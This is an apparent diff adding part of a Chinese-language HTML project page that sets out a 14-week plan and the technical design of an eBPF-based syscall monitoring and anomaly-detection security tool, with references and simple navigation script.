+            <div class="bg-white rounded-lg p-6 border border-gray-200">
+              <h4 class="text-lg font-semibold mb-4 flex items-center">
+                <i class="fas fa-file-alt text-green-600 mr-2"></i>
+                告警与报告可解释性
+              </h4>
+              <div class="space-y-4">
+                <div>
+                  <h5 class="font-semibold text-sm mb-2">告警上下文信息关联</h5>
+                  <p class="text-sm text-gray-600">
+                    提供进程信息、事件详情、相关事件、规则信息等丰富上下文。
+                  </p>
+                </div>
+                <div>
+                  <h5 class="font-semibold text-sm mb-2">攻击链图谱可视化</h5>
+                  <p class="text-sm text-gray-600">
+                    直观展示攻击源头、路径和影响，比文本日志更易于理解。
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Timeline Section -->
+      <section id="timeline" class="mb-16">
+        <h2 class="text-3xl font-bold mb-8 serif">详细开发计划 (14 周)</h2>
+
+        <div class="relative">
+          <!-- Phase 1 -->
+          <div class="timeline-item">
+            <h3 class="text-xl font-semibold mb-4">第一阶段：环境准备与 eBPF 核心链路 (周 1-4)</h3>
+
+            <div class="grid md:grid-cols-2 gap-6">
+              <div class="bg-white rounded-lg p-6 border border-gray-200">
+                <h4 class="font-semibold mb-3">周 1：项目起步与环境搭建</h4>
+                <ul class="text-sm text-gray-600 space-y-2">
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>搭建 openEuler 25.09 开发环境</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>编写 setup.sh 安装脚本</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>运行 bpftrace 简单示例</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>验证系统调用捕获能力</li>
+                </ul>
+              </div>
+
+              <div class="bg-white rounded-lg p-6 border border-gray-200">
+                <h4 class="font-semibold mb-3">周 2：最简 eBPF 程序</h4>
+                <ul class="text-sm text-gray-600 space-y-2">
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>使用 libbpf 和 CO-RE 模式</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>实现 Ring Buffer 数据传输</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>捕获关键字段 (pid, comm, syscall)</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>输出 JSON 格式事件</li>
+                </ul>
+              </div>
+
+              <div class="bg-white rounded-lg p-6 border border-gray-200">
+                <h4 class="font-semibold mb-3">周 3：系统调用过滤与聚合</h4>
+                <ul class="text-sm text-gray-600 space-y-2">
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>实现进程/UID/syscall 过滤</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>添加聚合统计功能</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>配置 YAML 格式规则</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>构建命令行 Dashboard</li>
+                </ul>
+              </div>
+
+              <div class="bg-white rounded-lg p-6 border border-gray-200">
+                <h4 class="font-semibold mb-3">周 4：轻量日志规则引擎</h4>
+                <ul class="text-sm text-gray-600 space-y-2">
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>实现 YAML 规则解析</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>构建轻量级匹配引擎</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>生成告警事件</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>保存事件上下文</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+
+          <!-- Phase 2 -->
+          <div class="timeline-item">
+            <h3 class="text-xl font-semibold mb-4">第二阶段：数据存储与后端架构 (周 5-8)</h3>
+
+            <div class="grid md:grid-cols-2 gap-6">
+              <div class="bg-white rounded-lg p-6 border border-gray-200">
+                <h4 class="font-semibold mb-3">周 5：事件存储与索引设计</h4>
+                <ul class="text-sm text-gray-600 space-y-2">
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>设计 SQLite 数据库 Schema</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>实现数据写入模块</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>构建 REST 查询 API</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>优化查询性能</li>
+                </ul>
+              </div>
+
+              <div class="bg-white rounded-lg p-6 border border-gray-200">
+                <h4 class="font-semibold mb-3">周 6：后端数据流与 WebSocket</h4>
+                <ul class="text-sm text-gray-600 space-y-2">
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>实现 Go 后端服务骨架</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>添加 WebSocket 实时推送</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>设计事件消息格式</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>实现反压机制</li>
+                </ul>
+              </div>
+
+              <div class="bg-white rounded-lg p-6 border border-gray-200">
+                <h4 class="font-semibold mb-3">周 7：关系图谱模型构建</h4>
+                <ul class="text-sm text-gray-600 space-y-2">
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>设计图谱数据模型</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>实现事件到图的转换</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>构建子图查询 API</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>生成 D3-friendly JSON</li>
+                </ul>
+              </div>
+
+              <div class="bg-white rounded-lg p-6 border border-gray-200">
+                <h4 class="font-semibold mb-3">周 8：前端可视化 PoC</h4>
+                <ul class="text-sm text-gray-600 space-y-2">
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>使用 D3.js 力导向布局</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>实现节点交互功能</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>添加实时更新支持</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>构建基本时间线视图</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+
+          <!-- Phase 3 -->
+          <div class="timeline-item">
+            <h3 class="text-xl font-semibold mb-4">第三阶段：可视化增强与 AI 模型 (周 9-11)</h3>
+
+            <div class="grid md:grid-cols-3 gap-6">
+              <div class="bg-white rounded-lg p-6 border border-gray-200">
+                <h4 class="font-semibold mb-3">周 9：可视化交互增强</h4>
+                <ul class="text-sm text-gray-600 space-y-2">
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>添加时间滑块控件</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>实现图谱过滤功能</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>添加节点搜索</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>支持时间回放</li>
+                </ul>
+              </div>
+
+              <div class="bg-white rounded-lg p-6 border border-gray-200">
+                <h4 class="font-semibold mb-3">周 10：轻量 AI 异常检测</h4>
+                <ul class="text-sm text-gray-600 space-y-2">
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>实现特征工程模块</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>训练 Isolation Forest 模型</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>构建评分系统</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>生成可疑事件报告</li>
+                </ul>
+              </div>
+
+              <div class="bg-white rounded-lg p-6 border border-gray-200">
+                <h4 class="font-semibold mb-3">周 11：AI 与规则引擎联动</h4>
+                <ul class="text-sm text-gray-600 space-y-2">
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>实现 Go-Python 通信</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>添加异常评分到告警</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>提供可解释性信息</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>实现告警升级机制</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+
+          <!-- Phase 4 -->
+          <div class="timeline-item">
+            <h3 class="text-xl font-semibold mb-4">第四阶段：报告生成与最终交付 (周 12-14)</h3>
+
+            <div class="grid md:grid-cols-3 gap-6">
+              <div class="bg-white rounded-lg p-6 border border-gray-200">
+                <h4 class="font-semibold mb-3">周 12：自动化报告生成</h4>
+                <ul class="text-sm text-gray-600 space-y-2">
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>设计 HTML 报告模板</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>实现 PDF 导出功能</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>添加图谱截图</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>生成时间线表格</li>
+                </ul>
+              </div>
+
+              <div class="bg-white rounded-lg p-6 border border-gray-200">
+                <h4 class="font-semibold mb-3">周 13：整合测试与优化</h4>
+                <ul class="text-sm text-gray-600 space-y-2">
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>编写集成测试脚本</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>性能基准测试</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>安全加固检查</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>优化系统配置</li>
+                </ul>
+              </div>
+
+              <div class="bg-white rounded-lg p-6 border border-gray-200">
+                <h4 class="font-semibold mb-3">周 14：最终交付</h4>
+                <ul class="text-sm text-gray-600 space-y-2">
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>完善项目文档</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>制作演示视频</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>准备交付包</li>
+                  <li><i class="fas fa-check text-green-500 mr-2"></i>最终系统测试</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Technical Details -->
+      <section id="technical" class="mb-16">
+        <h2 class="text-3xl font-bold mb-8 serif">技术实现细节</h2>
+
+        <div class="mb-12">
+          <h3 class="text-2xl font-semibold mb-6">6.1 eBPF 程序设计 (C)</h3>
+
+          <div class="grid md:grid-cols-2 gap-8">
+            <div class="bg-white rounded-lg p-6 border border-gray-200">
+              <h4 class="text-lg font-semibold mb-4 flex items-center">
+                <i class="fas fa-cogs text-blue-600 mr-2"></i>
+                libbpf 和 CO-RE 实现
+              </h4>
+              <ul class="text-sm text-gray-600 space-y-2">
+                <li>基于
+                  <code>libbpf</code> 库开发，采用 CO-RE 技术
+                </li>
+                <li>依赖内核 BTF 信息实现一次编译，到处运行</li>
+                <li>使用
+                  <code>BPF_CORE_READ</code> 宏访问内核数据结构
+                </li>
+                <li>以
+                  <code>libbpf-bootstrap</code> 为项目模板
+                </li>
+              </ul>
+            </div>
+
+            <div class="bg-white rounded-lg p-6 border border-gray-200">
+              <h4 class="text-lg font-semibold mb-4 flex items-center">
+                <i class="fas fa-hook text-green-600 mr-2"></i>
+                Tracepoint 与 Kprobe 选择
+              </h4>
+              <ul class="text-sm text-gray-600 space-y-2">
+                <li>主要使用
+                  <code>tracepoint/syscalls/sys_enter_*</code>
+                </li>
+                <li>hook 系统调用的进入和退出事件</li>
+                <li>谨慎使用 kprobes 获取深层上下文</li>
+                <li>优先选择稳定的 ABI 接口</li>
+              </ul>
+            </div>
+          </div>
+
+          <div class="bg-white rounded-lg p-6 border border-gray-200 mt-8">
+            <h4 class="text-lg font-semibold mb-4 flex items-center">
+              <i class="fas fa-exchange-alt text-purple-600 mr-2"></i>
+              Ring Buffer 数据传输
+            </h4>
+            <div class="grid md:grid-cols-2 gap-6">
+              <div>
+                <h5 class="font-semibold mb-2">内核态实现</h5>
+                <ul class="text-sm text-gray-600 space-y-1">
+                  <li>定义与传输数据对应的 struct</li>
+                  <li>使用
+                    <code>bpf_ringbuf_output</code> 提交数据
+                  </li>
+                  <li>支持 per-CPU 缓冲区避免竞争</li>
+                </ul>
+              </div>
+              <div>
+                <h5 class="font-semibold mb-2">用户态读取</h5>
+                <ul class="text-sm text-gray-600 space-y-1">
+                  <li>Go 程序通过 libbpf API 轮询</li>
+                  <li>从 Ring Buffer 读取事件数据</li>
+                  <li>解析为 Go 结构体进行处理</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="mb-12">
+          <h3 class="text-2xl font-semibold mb-6">6.2 后端服务实现 (Go)</h3>
+
+          <div class="grid md:grid-cols-3 gap-6">
+            <div class="bg-white rounded-lg p-6 border border-gray-200">
+              <h4 class="text-lg font-semibold mb-4 flex items-center">
+                <i class="fas fa-download text-blue-600 mr-2"></i>
+                事件接收与处理
+              </h4>
+              <ul class="text-sm text-gray-600 space-y-2">
+                <li>使用
+                  <code>cilium/ebpf</code> 或
+                  <code>libbpf-go</code> 交互
+                </li>
+                <li>通过带缓冲 channel 解耦接收和处理</li>
+                <li>worker goroutine 并发处理事件</li>
+                <li>提高系统吞吐量和响应性</li>
+              </ul>
+            </div>
+
+            <div class="bg-white rounded-lg p-6 border border-gray-200">
+              <h4 class="text-lg font-semibold mb-4 flex items-center">
+                <i class="fas fa-filter text-green-600 mr-2"></i>
+                规则引擎实现
+              </h4>
+              <ul class="text-sm text-gray-600 space-y-2">
+                <li>基于轻量级表达式求值库实现</li>
+                <li>支持
+                  <code>govaluate</code> 或
+                  <code>expr</code> 库
+                </li>
+                <li>YAML 规则解析为可执行表达式</li>
+                <li>缓存解析后的规则提高性能</li>
+              </ul>
+            </div>
+
+            <div class="bg-white rounded-lg p-6 border border-gray-200">
+              <h4 class="text-lg font-semibold mb-4 flex items-center">
+                <i class="fas fa-plug text-purple-600 mr-2"></i>
+                API 与 WebSocket
+              </h4>
+              <ul class="text-sm text-gray-600 space-y-2">
+                <li>使用
+                  <code>gin-gonic/gin</code> 或
+                  <code>gorilla/mux</code>
+                </li>
+                <li>RESTful API 提供查询接口</li>
+                <li>WebSocket 实时推送事件和图谱更新</li>
+                <li>支持事件流和告警推送</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+        <div class="mb-12">
+          <h3 class="text-2xl font-semibold mb-6">6.3 AI 异常检测模块 (Python)</h3>
+
+          <div class="grid md:grid-cols-3 gap-6">
+            <div class="bg-white rounded-lg p-6 border border-gray-200">
+              <h4 class="text-lg font-semibold mb-4 flex items-center">
+                <i class="fas fa-chart-bar text-blue-600 mr-2"></i>
+                特征工程实现
+              </h4>
+              <ul class="text-sm text-gray-600 space-y-2">
+                <li>使用
+                  <code>pandas</code> 和
+                  <code>numpy</code> 处理数据
+                </li>
+                <li>提取统计特征（频率、数量等）</li>
+                <li>构建序列特征（N-gram 向量）</li>
+                <li>计算图特征（节点度、聚类系数）</li>
+              </ul>
+            </div>
+
+            <div class="bg-white rounded-lg p-6 border border-gray-200">
+              <h4 class="text-lg font-semibold mb-4 flex items-center">
+                <i class="fas fa-robot text-green-600 mr-2"></i>
+                模型训练与推理
+              </h4>
+              <ul class="text-sm text-gray-600 space-y-2">
+                <li>使用
+                  <code>scikit-learn</code> 的
+                  <code>IsolationForest</code>
+                </li>
+                <li>仅使用正常行为数据训练基线</li>
+                <li>通过
+                  <code>decision_function</code> 计算异常分数
+                </li>
+                <li>支持增量学习适应业务变化</li>
+              </ul>
+            </div>
+
+            <div class="bg-white rounded-lg p-6 border border-gray-200">
+              <h4 class="text-lg font-semibold mb-4 flex items-center">
+                <i class="fas fa-exchange-alt text-purple-600 mr-2"></i>
+                与 Go 后端通信
+              </h4>
+              <ul class="text-sm text-gray-600 space-y-2">
+                <li>通过 HTTP local REST 接口通信</li>
+                <li>Redis 作为消息队列中间件</li>
+                <li>异步处理提高吞吐量</li>
+                <li>支持批量事件评分</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- References -->
+      <section class="bg-white rounded-lg p-8 border border-gray-200">
+        <h2 class="text-2xl font-bold mb-6 serif">参考文献</h2>
+        <div class="grid md:grid-cols-2 gap-4 text-sm">
+          <div id="ref-131" class="mb-4">
+            <span class="citation">131</span>
+            <a href="https://github.com/yunwei37/Eunomia" class="text-blue-600 hover:underline">Eunomia: eBPF 技术实践</a>
+          </div>
+          <div id="ref-118" class="mb-4">
+            <span class="citation">118</span>
+            <a href="https://www.eet-china.com/mp/a348468.html" class="text-blue-600 hover:underline">Falco 规则引擎设计</a>
+          </div>
+          <div id="ref-120" class="mb-4">
+            <span class="citation">120</span>
+            <a href="https://www.cnblogs.com/davad/p/ebpf-an-quan-xiang-mu-tracee-chu-tan.html" class="text-blue-600 hover:underline">Tracee 安全项目初探</a>
+          </div>
+          <div id="ref-154" class="mb-4">
+            <span class="citation">154</span>
+            <a href="https://zhuanlan.zhihu.com/p/687679080" class="text-blue-600 hover:underline">eBPF 系统调用捕获</a>
+          </div>
+          <div id="ref-122" class="mb-4">
+            <span class="citation">122</span>
+            <a href="https://www.cnblogs.com/janeysj/p/16254048.html" class="text-blue-600 hover:underline">CO-RE 技术分析</a>
+          </div>
+          <div id="ref-138" class="mb-4">
+            <span class="citation">138</span>
+            <a href="https://github.com/evilsocket/ebpf-process-anomaly-detection" class="text-blue-600 hover:underline">eBPF 进程异常检测</a>
+          </div>
+          <div id="ref-119" class="mb-4">
+            <span class="citation">119</span>
+            <a href="https://juejin.cn/post/7126526384075178020" class="text-blue-600 hover:underline">Tracee 事件捕获机制</a>
+          </div>
+          <div id="ref-123" class="mb-4">
+            <span class="citation">123</span>
+            <a href="https://aquasecurity.github.io/tracee/v0.8.1/detecting/" class="text-blue-600 hover:underline">Tracee 检测规则文档</a>
+          </div>
+          <div id="ref-156" class="mb-4">
+            <span class="citation">156</span>
+            <a href="https://blog.nsfocus.net/tetragon/" class="text-blue-600 hover:underline">Tetragon eBPF 安全工具</a>
+          </div>
+          <div id="ref-247" class="mb-4">
+            <span class="citation">247</span>
+            <a href="https://juejin.cn/post/7408723089611800626" class="text-blue-600 hover:underline">Python 项目管理最佳实践</a>
+          </div>
+          <div id="ref-248" class="mb-4">
+            <span class="citation">248</span>
+            <a href="https://blog.csdn.net/dQCFKyQDXYm3F8rB0/article/details/126276799" class="text-blue-600 hover:underline">Poetry 依赖管理指南</a>
+          </div>
+          <div id="ref-229" class="mb-4">
+            <span class="citation">229</span>
+            <a href="https://wap.sciencenet.cn/blog-3525898-1494214.html?mobile=1" class="text-blue-600 hover:underline">Isolation Forest 算法原理</a>
+          </div>
+          <div id="ref-236" class="mb-4">
+            <span class="citation">236</span>
+            <a href="https://tonybai.com/2022/07/05/develop-hello-world-ebpf-program-in-c-from-scratch/" class="text-blue-600 hover:underline">eBPF CO-RE 技术实践</a>
+          </div>
+          <div id="ref-252" class="mb-4">
+            <span class="citation">252</span>
+            <a href="https://openanolis.cn/assets/static/eBPF_technical_practice.pdf" class="text-blue-600 hover:underline">eBPF 技术实践白皮书</a>
+          </div>
+        </div>
+      </section>
+    </main>
+
+    <script>
+        // Smooth scrolling for anchor links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+            });
+        });
+
+        // Highlight current section in TOC
+        const observerOptions = {
+            rootMargin: '-20% 0px -80% 0px',
+            threshold: 0
+        };
+
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                const id = entry.target.id;
+                const tocLink = document.querySelector(`a[href="#${id}"]`);
+                
+                if (entry.isIntersecting) {
+                    // Remove active class from all TOC links
+                    document.querySelectorAll('.toc-fixed a').forEach(link => {
+                        link.classList.remove('text-blue-600', 'font-semibold');
+                        link.classList.add('text-gray-600');
+                    });
+                    
+                    // Add active class to current TOC link
+                    if (tocLink) {
+                        tocLink.classList.remove('text-gray-600');
+                        tocLink.classList.add('text-blue-600', 'font-semibold');
+                    }
+                }
+            });
+        }, observerOptions);
+
+        // Observe all sections
+        document.querySelectorAll('section[id]').forEach(section => {
+            observer.observe(section);
+        });
+    </script>
+  
+
+</body></html>
